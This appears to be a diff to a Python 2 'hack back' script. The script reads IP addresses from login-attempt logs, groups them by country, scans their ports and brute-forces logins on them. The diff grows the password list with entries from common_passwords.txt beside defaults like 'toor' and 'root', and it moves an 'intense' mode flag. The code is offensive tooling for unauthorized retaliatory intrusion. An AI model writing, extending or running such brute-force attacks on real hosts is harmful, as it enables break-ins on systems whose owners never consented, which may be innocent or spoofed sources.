@@ -47,7 +47,11 @@ def pull_rogue_ip_list():
     counter = {}
     for line in swap(base+'/OSINT/unique.txt', False):
         ip = line.split(' : ')[0]
-        login_attempts = line.split(' : ')[1]
+        try:
+            login_attempts = line.split(' : ')[1]
+        except IndexError:
+            login_attempts = 0
+            pass
         counter[ip] = int(login_attempts)
     return list(set(counter.keys())), counter
 
@@ -123,6 +127,8 @@ def hack_back(ip, determined):
         # random.shuffle(common
     else:
         common = ['admin', 'default', 'password', 'password123', 'toor', 'root']
+        for entry in swap('common_passwords.txt', False)[0:40]:
+            common.append(entry)
     print '... Bruteforcing %s' % ip
     for u in names:
         for pw in common:
@@ -185,14 +191,14 @@ def attack(address, strong):
             pass
 
 
+intense = True
 rogue_ips, login_attempts = pull_rogue_ip_list()
 ip_locations, country_counts, country_codes = retrieve_unauthorized_origins()
-intense = True
-if '!!' in sys.argv:
-    intense = True
+
 if 'target' in sys.argv:
     locale = sys.argv[2]
-
+    if '!!' in sys.argv:
+        intense = True
     if locale in country_codes.keys():
         target = country_codes[locale]
     elif locale.upper() in country_codes.values():
@@ -202,7 +208,8 @@ if 'target' in sys.argv:
     targets = ip_locations[target]
     print '[*] %d Targets Acquired From %s' % (len(targets), target)
     tic = time.time()
-
+    if intense:
+        print '[*] INTENSE Mode Enabled'
     # Scan Open Ports
     for address in targets:
         try:
